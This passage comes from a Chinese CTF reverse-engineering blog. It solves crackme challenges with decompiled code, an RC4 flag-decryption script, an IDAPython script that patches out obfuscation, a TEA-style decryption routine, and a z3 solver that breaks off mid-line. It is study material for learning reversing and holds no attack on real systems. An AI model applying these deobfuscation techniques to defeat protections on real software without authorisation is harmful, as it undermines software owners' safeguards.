class="line">  if ( sub_403E31() )</span><br><span class="line">    j___loaddll((char *)0x539);</span><br><span class="line">  if ( sub_403D5A() )</span><br><span class="line">    j___loaddll((char *)0x539);</span><br><span class="line">  if ( sub_403067() )</span><br><span class="line">    j___loaddll((char *)0x539);</span><br><span class="line">  v3 = sub_403E68();</span><br><span class="line">  if ( v3 )</span><br><span class="line">    v3 = j___loaddll((char *)0x539);</span><br><span class="line">  *(_DWORD *)Str = v3;</span><br><span class="line">  strcpy(v13, &quot;5678&quot;);</span><br><span class="line">  j__memset(&amp;v13[6], 0, 0x76u);</span><br><span class="line">  strcpy(Str1, &quot;flag&#123;oh!yougotthefakeflagnowxxxxxxxxxx&#125;&quot;);</span><br><span class="line">  Str1[40] = aFlagOhYougotth[40];</span><br><span class="line">  j__memset(v11, 0, sizeof(v11));</span><br><span class="line">  Str2[0] = -35;</span><br><span class="line">  Str2[1] = -97;</span><br><span class="line">  Str2[2] = 88;</span><br><span class="line">  Str2[3] = -77;</span><br><span class="line">  Str2[4] = 114;</span><br><span class="line">  Str2[5] = -56;</span><br><span class="line">  Str2[6] = -79;</span><br><span class="line">  Str2[7] = -46;</span><br><span class="line">  Str2[8] = -111;</span><br><span class="line">  Str2[9] = 65;</span><br><span class="line">  Str2[10] = 111;</span><br><span class="line">  Str2[11] = -69;</span><br><span class="line">  Str2[12] = -55;</span><br><span class="line">  Str2[13] = 92;</span><br><span class="line">  Str2[14] = 123;</span><br><span class="line">  Str2[15] = -63;</span><br><span class="line">  Str2[16] = 19;</span><br><span class="line">  Str2[17] = -19;</span><br><span class="line">  Str2[18] = -5;</span><br><span class="line">  Str2[19] = 40;</span><br><span class="line">  Str2[20] = -77;</span><br><span class="line">  Str2[21] = 16;</span><br><span class="line">  Str2[22] = 11;</span><br><span class="line">  Str2[23] = -49;</span><br><span class="line">  Str2[24] = 33;</span><br><span class="line">  Str2[25] = 104;</span><br><span class="line">  Str2[26] = -94;</span><br><span class="line">  Str2[27] = -122;</span><br><span class="line">  Str2[28] = 107;</span><br><span class="line">  Str2[29] = -98;</span><br><span class="line">  Str2[30] = -112;</span><br><span class="line">  Str2[31] = 29;</span><br><span class="line">  Str2[32] = -54;</span><br><span class="line">  Str2[33] = -12;</span><br><span class="line">  Str2[34] = 9;</span><br><span class="line">  Str2[35] = 30;</span><br><span class="line">  Str2[36] = -24;</span><br><span class="line">  Str2[37] = 121;</span><br><span class="line">  Str2[38] = 106;</span><br><span class="line">  j__memset(v9, 0, sizeof(v9));</span><br><span class="line">  v7 = j__malloc(0x408u);</span><br><span class="line">  if ( sub_403E68() )</span><br><span class="line">    return 0;</span><br><span class="line">  if ( sub_4021FD() )</span><br><span class="line">    return 0;</span><br><span class="line">  if ( sub_404A48() )</span><br><span class="line">    return 1;</span><br><span class="line">  if ( sub_403373() )</span><br><span class="line">    return 1;</span><br><span class="line">  if ( sub_402EEB() )</span><br><span class="line">    return 2;</span><br><span class="line">  sub_404831(dword_4960C4, &quot;%s&quot;, Str1);</span><br><span class="line">  v5 = j__strlen(Str);</span><br><span class="line">  sub_401C21((int)v7, (int)Str, v5);</span><br><span class="line">  if ( sub_402473() )</span><br><span class="line">    return 3;</span><br><span class="line">  v6 = j__strlen(Str1);</span><br><span class="line">  sub_402DEC((int)v7, (int)Str1, v6);</span><br><span class="line">  if ( sub_40149C() )</span><br><span class="line">    return 2;</span><br><span class="line">  if ( !j__strcmp(Str1, Str2) )</span><br><span class="line">    sub_404831(dword_4960C0, &quot;%s\n&quot;, &quot;Correct!&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> &emsp;这里比较坑的一点是：上述代码写的有问题（主要是<code>Str</code>这里，只写了<code>strcpy(v13,&quot;5678&quot;)</code>），看一下相应的汇编：</p>
<p><img src="/images/re-part-5/image-20221226114957888-167980209732311.png" alt="image-20221226114957888"></p>
<p> &emsp;我倾向于认为上述红框部分写错了，应该是<code>lea eax a12345678[ecx]</code>，这样的话把<code>1234</code>赋给<code>eax</code>，之后使用<code>mov dword ptr [ebp+Str], eax</code>把<code>1234</code>赋给<code>Str</code>，又由于<code>Str,var_84,var_84+4</code>是连着的，所以相当于<code>Str</code>保存了<code>12345678</code>字符串。</p>
<p> &emsp;反编译之后主要就是俩函数非常重要，但是逆了几天还是不行，查了查wp是rc4，突然卧槽，真是，赶紧复习一波rc4。复习完之后，找了个rc4加解密脚本，直接写解题脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># @Time  : 2022/12/26 13:46:47</span><br><span class="line"># @Author: wd-2711</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">from Crypto.Cipher import ARC4</span><br><span class="line"></span><br><span class="line">def rc4_encrypt(data, key1):       </span><br><span class="line">    key = bytes(key1, encoding=&#x27;utf-8&#x27;)</span><br><span class="line">    enc = ARC4.new(key)</span><br><span class="line">    res = enc.encrypt(data.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">def rc4_decrypt(data, key1):  </span><br><span class="line">    key = bytes(key1, encoding=&#x27;utf-8&#x27;)</span><br><span class="line">    enc = ARC4.new(key)</span><br><span class="line">    res = enc.decrypt(data)</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    key = &#x27;12345678&#x27;</span><br><span class="line"></span><br><span class="line">    encrypt_data = [0xDD,0x9F,0x58,0xB3,0x72,0xC8,0xB1,0xD2,0x91,0x41,0x6F,0xBB,0xC9,0x5C,0x7B,0xC1,0x13,0xED,0xFB,0x28,0xB3,0x10,0xB,0xCF,0x21,0x68,0xA2,0x86,0x6B,0x9E,0x90,0x1D,0xCA,0xF4,9,0x1E,0xE8,0x79,0x6A]</span><br><span class="line">    encrypt_data = [str(hex(i)).replace(&quot;0x&quot;, &quot;&quot;).zfill(2) for i in encrypt_data]</span><br><span class="line"></span><br><span class="line">    encrypt_data = bytes.fromhex(&#x27;&#x27;.join(encrypt_data))</span><br><span class="line">    print(&#x27;解密后:&#x27;,rc4_decrypt(encrypt_data, key))</span><br></pre></td></tr></table></figure>
<p> &emsp;一个小坑就是，我认为他官方wp把<code>0xFB</code>看成了<code>0xF8</code>，导致官方wp设置的是：<code>flag&#123;youaretoasdaseazxvzxsw123sssssxxx&#125;</code>，而我得出的是<code>flag&#123;youaretoasdasfazxvzxsw123sssssxxx&#125;</code>。服了，能不能认真一点。</p>
<h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p> &emsp;之前反混淆都是手动，尝试直接写脚本来处理。仿照之前的<a href="https://wd-2711.tech/2022/11/14/serial150-wp/">serial150-wp</a>里的脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from idc_bc695 import *</span><br><span class="line">beginAddr = 0x4116A0</span><br><span class="line">endAddr = 0x411B21</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    for i in range(endAddr - beginAddr):</span><br><span class="line">    </span><br><span class="line">        code = [0xB8, -1, -1, -1, -1, 0xBB, -1, -1, -1, -1, 0x2B, 0xD8, 0x58, 0x40, 0x83, 0xC0, 1, 3, 0xD8, 0x53, 0xC3]</span><br><span class="line">        flag = 0</span><br><span class="line">        loc = i + beginAddr</span><br><span class="line">        for ind in range(len(code)):</span><br><span class="line">            if code[ind] == -1: continue</span><br><span class="line">            if code[ind] != Byte(loc + ind):</span><br><span class="line">                flag = 1</span><br><span class="line">                break</span><br><span class="line">        if flag == 1: continue</span><br><span class="line">        </span><br><span class="line">        if Byte(loc - 1) == 0xC7:</span><br><span class="line">            # print(&quot;patch&quot;)</span><br><span class="line">            PatchByte(loc - 1, 0x90)</span><br><span class="line">        if Byte(loc + len(code)) == 0x8D:</span><br><span class="line">            # print(&quot;patch&quot;)</span><br><span class="line">            PatchByte(loc + len(code), 0x90)    </span><br><span class="line">    </span><br><span class="line">        jmpAddr = 0</span><br><span class="line">        mul = 1</span><br><span class="line">        for i in range(4):</span><br><span class="line">            jmpAddr += mul * Byte(loc + 6 + i)</span><br><span class="line">            mul *= 256</span><br><span class="line">        print(hex(jmpAddr), hex(loc))</span><br><span class="line">        jmpAddr = str(hex(jmpAddr - (5 + loc)))[2:].zfill(8)</span><br><span class="line">        print(jmpAddr)</span><br><span class="line">        for i in range(5):</span><br><span class="line">            if i == 0:</span><br><span class="line">                # print(&quot;patch&quot;)</span><br><span class="line">                PatchByte(loc + i, 0xE9)</span><br><span class="line">            else:</span><br><span class="line">                # print(jmpAddr[-2:])</span><br><span class="line">                PatchByte(loc + i, int(jmpAddr[-2:], 16))</span><br><span class="line">                jmpAddr = jmpAddr[:-2]</span><br><span class="line">    </span><br><span class="line">        for i in range(len(code) - 5):</span><br><span class="line">            # print(&quot;patch&quot;)</span><br><span class="line">            PatchByte(loc + i + 5, 0x90)</span><br></pre></td></tr></table></figure>
<p> &emsp;经过调试整合之后，看上去比手动的好多了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main_0(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v4; // eax</span><br><span class="line">  size_t v5; // eax</span><br><span class="line">  void *v6; // [esp+25Ch] [ebp-4A4h]</span><br><span class="line">  char Str2[39]; // [esp+268h] [ebp-498h] BYREF</span><br><span class="line">  char v8[473]; // [esp+28Fh] [ebp-471h] BYREF</span><br><span class="line">  char Str1[41]; // [esp+470h] [ebp-290h] BYREF</span><br><span class="line">  char v10[471]; // [esp+499h] [ebp-267h] BYREF</span><br><span class="line">  char Str[10]; // [esp+678h] [ebp-88h] BYREF</span><br><span class="line">  char v12[118]; // [esp+682h] [ebp-7Eh] BYREF</span><br><span class="line"></span><br><span class="line">  if ( sub_403E31() )</span><br><span class="line">    j___loaddll((char *)0x539);</span><br><span class="line">  if ( sub_403D5A() )</span><br><span class="line">    j___loaddll((char *)0x539);</span><br><span class="line">  if ( sub_403067() )</span><br><span class="line">    j___loaddll((char *)0x539);</span><br><span class="line">  if ( sub_403E68() )</span><br><span class="line">    j___loaddll((char *)0x539);</span><br><span class="line">  strcpy(Str, &quot;12345678&quot;);</span><br><span class="line">  j__memset(v12, 0, sizeof(v12));</span><br><span class="line">  strcpy(Str1, &quot;flag&#123;oh!yougotthefakeflagnowxxxxxxxxxx&#125;&quot;);</span><br><span class="line">  Str1[40] = aFlagOhYougotth[40];</span><br><span class="line">  j__memset(v10, 0, sizeof(v10));</span><br><span class="line">  Str2[0] = -35;</span><br><span class="line">  Str2[1] = -97;</span><br><span class="line">  Str2[2] = 88;</span><br><span class="line">  Str2[3] = -77;</span><br><span class="line">  Str2[4] = 114;</span><br><span class="line">  Str2[5] = -56;</span><br><span class="line">  Str2[6] = -79;</span><br><span class="line">  Str2[7] = -46;</span><br><span class="line">  Str2[8] = -111;</span><br><span class="line">  Str2[9] = 65;</span><br><span class="line">  Str2[10] = 111;</span><br><span class="line">  Str2[11] = -69;</span><br><span class="line">  Str2[12] = -55;</span><br><span class="line">  Str2[13] = 92;</span><br><span class="line">  Str2[14] = 123;</span><br><span class="line">  Str2[15] = -63;</span><br><span class="line">  Str2[16] = 19;</span><br><span class="line">  Str2[17] = -19;</span><br><span class="line">  Str2[18] = -5;</span><br><span class="line">  Str2[19] = 40;</span><br><span class="line">  Str2[20] = -77;</span><br><span class="line">  Str2[21] = 16;</span><br><span class="line">  Str2[22] = 11;</span><br><span class="line">  Str2[23] = -49;</span><br><span class="line">  Str2[24] = 33;</span><br><span class="line">  Str2[25] = 104;</span><br><span class="line">  Str2[26] = -94;</span><br><span class="line">  Str2[27] = -122;</span><br><span class="line">  Str2[28] = 107;</span><br><span class="line">  Str2[29] = -98;</span><br><span class="line">  Str2[30] = -112;</span><br><span class="line">  Str2[31] = 29;</span><br><span class="line">  Str2[32] = -54;</span><br><span class="line">  Str2[33] = -12;</span><br><span class="line">  Str2[34] = 9;</span><br><span class="line">  Str2[35] = 30;</span><br><span class="line">  Str2[36] = -24;</span><br><span class="line">  Str2[37] = 121;</span><br><span class="line">  Str2[38] = 106;</span><br><span class="line">  j__memset(v8, 0, sizeof(v8));</span><br><span class="line">  v6 = j__malloc(0x408u);</span><br><span class="line">  if ( sub_403E68() )</span><br><span class="line">    return 0;</span><br><span class="line">  if ( sub_4021FD() )</span><br><span class="line">    return 0;</span><br><span class="line">  if ( sub_404A48() )</span><br><span class="line">    return 1;</span><br><span class="line">  if ( sub_403373() )</span><br><span class="line">    return 1;</span><br><span class="line">  if ( sub_402EEB() )</span><br><span class="line">    return 2;</span><br><span class="line">  sub_404831(dword_4960C4 ^ (unsigned int)sub_4019CE, &quot;%s&quot;, Str1);</span><br><span class="line">  v4 = j__strlen(Str);</span><br><span class="line">  sub_401C21(v6, Str, v4);</span><br><span class="line">  if ( sub_402473() )</span><br><span class="line">    return 3;</span><br><span class="line">  v5 = j__strlen(Str1);</span><br><span class="line">  sub_402DEC(v6, Str1, v5);</span><br><span class="line">  if ( sub_40149C() )</span><br><span class="line">    return 2;</span><br><span class="line">  if ( !j__strcmp(Str1, Str2) )</span><br><span class="line">    sub_404831(dword_4960C0, &quot;%s\n&quot;, &quot;Correct!&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>知识点1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lea eax,[1001H]` 等价于`mov eax,1001H</span><br></pre></td></tr></table></figure>
<p><strong>知识点2：RC4算法</strong></p>
<p> &emsp;可用于SSL，WLAN啥的。大致流程：</p>
<p><img src="/images/re-part-5/image-20221226120320912-167980209732313.png" alt="image-20221226120320912"></p>
<p> &emsp;具体流程图（密码学学过）：</p>
<p><img src="/images/re-part-5/image-20221226130122192-167980209732315.png" alt="image-20221226130122192"></p>
<p> &emsp;解释一下上图：</p>
<p>&emsp;1.先初始化状态向量S（256个字节，用来作为密钥流生成的种子1）。按照升序，给每个字节赋值0,1,2,3,4,5,6…..,254,255。</p>
<p>&emsp;2.初始密钥T（由用户输入），长度任意。如果输入长度小于256个字节，则进行轮转，直到填满。例如输入密钥的是1,2,3,4,5 , 那么填入的是1,2,3,4,5,1,2,3,4,5,1,2,3,4,5……..</p>
<p>&emsp;3.开始对状态向量S进行置换操作（用来打乱初始种子1）。按照下列规则进行：</p>
<p>（从第零个字节开始，执行256次，保证每个字节都得到处理）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">j = 0;</span><br><span class="line">for (i = 0 ; i &lt; 256 ; i++) &#123;</span><br><span class="line">    j = (j + S[i] + T[i]) mod 256;</span><br><span class="line">    swap(S[i], S[j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;4.最后是密钥流的生成与加密，假设我的明文字节数是datalength=1024个字节（当然可以是任意个字节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">i=0;</span><br><span class="line">j=0;</span><br><span class="line">while(datalength--)&#123;</span><br><span class="line">    //相当于执行1024次，这样生成的秘钥流也是1024个字节</span><br><span class="line">　　i = (i + 1) mod 256;</span><br><span class="line">　　j = (j + S[i]) mod 256;</span><br><span class="line">　　swap(S[i] , S[j]);</span><br><span class="line">　　t = (S[i] + S[j]) mod 256;</span><br><span class="line">　　k = S[t];</span><br><span class="line">　　//这里的K就是当前生成的一个秘钥流中的一位</span><br><span class="line">　　//可以直接在这里进行加密，当然也可以将密钥流保存在数组中，最后进行异或就ok</span><br><span class="line">　　data[]=data[]^k； //进行加密，&quot;^&quot;是异或运算符</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="reverse-re4"><a href="#reverse-re4" class="headerlink" title="reverse_re4"></a>reverse_re4</h1><h2 id="0x00-3"><a href="#0x00-3" class="headerlink" title="0x00"></a>0x00</h2><p> &emsp;32位的PE。ida看一下，还是考的反混淆呀。</p>
<p> &emsp;把混淆都nop掉，最终得到：</p>
<p><img src="/images/re-part-5/image-20221226174146656-167980209732317.png" alt="image-20221226174146656"></p>
<p> &emsp;写脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># @Time  : 2022/12/26 17:04:05</span><br><span class="line"># @Author: wd-2711</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">def function1(a1:list, a2:list) -&gt; list:</span><br><span class="line">    v6 = a1[0]</span><br><span class="line">    v5 = a1[1]</span><br><span class="line">    v4 = 0xc6ef3720</span><br><span class="line">    for i in range(0x20):</span><br><span class="line">        v5 = (v5 - ((a2[3] + (v6 &gt;&gt; 5)) ^ ((v4 + v6) &amp; 0xFFFFFFFF) ^ ((a2[2] + 16 * v6) &amp; 0xFFFFFFFF)) + 0xFFFFFFFF + 1) &amp; 0xFFFFFFFF</span><br><span class="line">        v6 = (v6 - ((a2[1] + (v5 &gt;&gt; 5)) ^ ((v4 + v5) &amp; 0xFFFFFFFF) ^ ((a2[0] + 16 * v5) &amp; 0xFFFFFFFF)) + 0xFFFFFFFF + 1) &amp; 0xFFFFFFFF</span><br><span class="line">        v4 = (v4 + 0x61C88647) &amp; 0xFFFFFFFF</span><br><span class="line">    return [v6, v5]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    target = [0x85A6892D,0xA177B6BD,0x89422515,0x159AE870,0x5BC09E5D,0xC13F293E,0x25B7084F,0xADB12A4C]</span><br><span class="line">    param_1 = [57315,4414,22679,13908]</span><br><span class="line"></span><br><span class="line">    tmp1 = []</span><br><span class="line">    for i in range(4):</span><br><span class="line">        tmp1.extend(function1(target[i*2:i*2+2], param_1))</span><br><span class="line"></span><br><span class="line">    for i in tmp1:</span><br><span class="line">        ii = str(hex(i))[2:]</span><br><span class="line">        while(len(ii)):</span><br><span class="line">            print(chr(int(ii[-2:], 16)), end = &quot;&quot;)</span><br><span class="line">            ii = ii[:-2]</span><br><span class="line"># fcf64fc9cc0e0fe70971fd6fc6fff602</span><br></pre></td></tr></table></figure>
<p> 比较简单。</p>
<hr>
<h1 id="crackeme"><a href="#crackeme" class="headerlink" title="crackeme"></a>crackeme</h1><h2 id="0x00-4"><a href="#0x00-4" class="headerlink" title="0x00"></a>0x00</h2><p> &emsp;64位ELF。感觉做过呢。</p>
<p> &emsp;其实没做过。</p>
<p><img src="/images/re-part-5/image-20221227142544798-167980209732319.png" alt="image-20221227142544798"></p>
<p> &emsp;主要就是上面的四个处理函数，其中第四个<code>sub_400D6A</code>是16个方程，一开始想用z3解，但是最后发现z3的解有问题，还是手解吧。</p>
<p> &emsp;直接上脚本咯，这个题还是比较麻烦的，但是不是思路意义上的麻烦。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># @Time  : 2022/12/27 10:44:54</span><br><span class="line"># @Author: wd-2711</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">def equationSolver():</span><br><span class="line">    # have problems</span><br><span class="line"></span><br><span class="line">    x = [BitVec(&#x27;x%s&#x27; % i, 8) for i in range(16)]</span><br><span class="line">    solver = Solver()</span><br><span class="line">    solver.add((0xFFFCE79E * x[0]) &amp; 0xFFFFFFFF == 0xFDF7FFB0)</span><br><span class="line">    solver.add((0x2C778 * x[0] + 0xFFFED97C * x[1]) &amp; 0xFFFFFFFF == 0x11BFAC4)</span><br><span class="line">    solver.add((0xFFFA7ED7 * x[1] + 0xFFF8E54C * x[2] + 0xFFFB6BF5 * x[0]) &amp; 0xFFFFFFFF == 0xF7542D5D)</span><br><span class="line">    solver.add((0xFFFE82A8 * x[0] + 0x5E652 * x[3] + 0xFFF82285 * x[2] + 0xA61E * x[1]) &amp; 0xFFFFFFFF == 0xFF849AD7)</span><br><span class="line">    solver.add((31288 * x[0] + 0xFFFB0C54 * x[3] + 0xFFFEA34F * x[1] + 0xFFFC577A * x[4] + 0xFFFC513C * x[2]) &amp; 0xFFFFFFFF == 0xFA855867)</span><br><span class="line">    solver.add((0xFFFBEE70 * x[2] + 216272 * x[5] + 411737 * x[0] + 210304 * x[3] + 0xFFFFDE2E * x[4] + 454111 * x[1]) &amp; 0xFFFFFFFF == 144299767)</span><br><span class="line">    solver.add((0xFFF9DC51 * x[4] + 0xFFF86BAC * x[0] + 367831 * x[2] + 371046 * x[5] + 0xFFFE1E87 * x[3] + 188174 * x[1] + 178541 * x[6]) &amp; 0xFFFFFFFF == 0xFDC60BE9)</span><br><span class="line">    solver.add((0xFFF9A92D * x[1] + 237549 * x[5] + 0xFFFB10F8 * x[7] + 0xFFFCD694 * x[3] + 0xFFFFA31C * x[0] + 94300 * x[4] + 364867 * x[6] + 273839 * x[2]) &amp; 0xFFFFFFFF == 0xFF76C4D2)</span><br><span class="line">    solver.add((511561 * x[5] + 0xFFFCB63A * x[0] + 44567 * x[6] + 179735 * x[2] + 55541 * x[8] + 0xFFFCDFCA * x[7] + 0xFFFD8DED * x[1] + 441741 * x[4] + 443248 * x[3]) &amp; 0xFFFFFFFF == 57425926)</span><br><span class="line">    solver.add((407430 * x[0] + 407030 * x[3] + 503571 * x[6] + 0xFFF95D87 * x[5] + 385646 * x[4] + 437781 * x[7] + 20147 * x[9] + 0xFFFFD627 * x[2] + 0xFFFC3872 * x[8] + 4963 * x[1]) &amp; 0xFFFFFFFF == 267063706)</span><br><span class="line">    solver.add((128236 * x[7] + 0xFFFD1AA5 * x[4] + 298269 * x[2] + 117737 * x[8] + 0xFFFF170A * x[1] + 503873 * x[5] + 0xFFFB9AB8 * x[9] + 0xFFF924EF * x[3] + 0xFFFB4D55 * x[6] + 0xFFFF1225 * x[0] + 313065 * x[10]) &amp; 0xFFFFFFFF == 0xFA195B00)</span><br><span class="line">    solver.add((127585 * x[3] + 447223 * x[10] + 0xFFF83118 * x[0] + 0xFFFF0269 * x[1] + 0xFFFE3B21 * x[11] + 0xFFFAFEA3 * x[6] + 2659 